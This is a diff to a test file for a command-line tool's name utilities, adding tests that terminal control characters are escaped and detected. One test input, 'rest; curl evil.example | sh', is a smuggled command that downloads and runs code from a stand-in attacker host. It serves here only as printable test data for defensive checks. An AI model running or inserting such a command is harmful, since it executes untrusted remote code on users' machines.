@@ -3,6 +3,8 @@ import { expect } from '@std/expect';
 import {
   deriveNames,
   escapeName,
+  escapeTerminalControls,
+  hasControlCharacter,
   isIdentifierSafe,
   isPathSegmentSafe,
 } from '../../src/utils/names.ts';
@@ -220,5 +222,53 @@ describe('isPathSegmentSafe — a portable project-name charset', () => {
     for (const input of ['my.app', '3d-shop', 'café', 'v1.2-api']) {
       expect(isPathSegmentSafe(deriveNames(input))).toBe(true);
     }
+  });
+});
+
+describe('escapeTerminalControls', () => {
+  // The sink escape: every control character the CLI never writes on purpose.
+  // The line feed and the tab are the two it does write, so both survive.
+  const ESCAPED: readonly (readonly [string, string])[] = [
+    ['carriage return', '\r'],
+    ['escape', String.fromCharCode(27)],
+    ['NUL', String.fromCharCode(0)],
+    ['DEL', String.fromCharCode(0x7f)],
+    ['C1 next line', '\u0085'],
+    ['line separator', '\u2028'],
+    ['paragraph separator', '\u2029'],
+  ];
+  for (const [label, char] of ESCAPED) {
+    it(`escapes ${label}`, () => {
+      const out = escapeTerminalControls(`a${char}b`);
+      expect(out.includes(char)).toBe(false);
+      expect(out).toMatch(/^a\\u[0-9a-f]{4}b$/);
+    });
+  }
+
+  it('keeps the line feed and the tab', () => {
+    expect(escapeTerminalControls('a\n\tb')).toBe('a\n\tb');
+  });
+
+  it('leaves printable text, including non-ASCII, untouched', () => {
+    expect(escapeTerminalControls('café `setu new` ✓')).toBe('café `setu new` ✓');
+  });
+});
+
+describe('hasControlCharacter', () => {
+  it('reports every character escapeName escapes', () => {
+    for (const char of ['\n', '\r', '\t', String.fromCharCode(27), '\u0085', '\u2028']) {
+      expect(hasControlCharacter(`a${char}b`)).toBe(true);
+      expect(escapeName(`a${char}b`)).not.toBe(`a${char}b`);
+    }
+  });
+
+  it('reports nothing for printable text', () => {
+    expect(hasControlCharacter('rest; curl evil.example | sh')).toBe(false);
+    expect(hasControlCharacter('café')).toBe(false);
+  });
+
+  // The regex is not global, so repeated calls cannot drift on lastIndex.
+  it('answers the same on repeated calls', () => {
+    expect([1, 2, 3].map(() => hasControlCharacter('a\nb'))).toEqual([true, true, true]);
   });
 });
